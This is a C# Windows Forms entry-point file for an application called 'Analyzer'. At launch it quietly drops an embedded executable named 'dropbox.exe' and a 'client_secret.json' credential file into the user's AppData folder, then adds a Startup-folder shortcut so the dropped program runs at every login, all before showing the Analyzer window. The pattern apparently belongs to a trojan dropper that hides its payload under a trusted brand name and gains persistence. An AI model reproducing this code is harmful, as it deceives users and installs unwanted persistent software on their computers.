using Analyzer.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Analyzer
{
    static class Program
    {
        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            CreateShortcut(CopyFile());
            Application.Run(new Analyser());

        }

        static string CopyFile()
        {
            string fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "dropbox.exe");
            string fileNameSecret = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "client_secret.json");
            File.WriteAllBytes(fileName, Resources.dropbox);
            File.WriteAllBytes(fileNameSecret, Resources.client_secret);
            return fileName;
        }

        static void CreateShortcut(string fileName)
        {
            IWshRuntimeLibrary.WshShell wsh = new IWshRuntimeLibrary.WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(
            Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\dropbox.lnk") as IWshRuntimeLibrary.IWshShortcut;
            shortcut.TargetPath = fileName;
            shortcut.Save();
        }
    }
}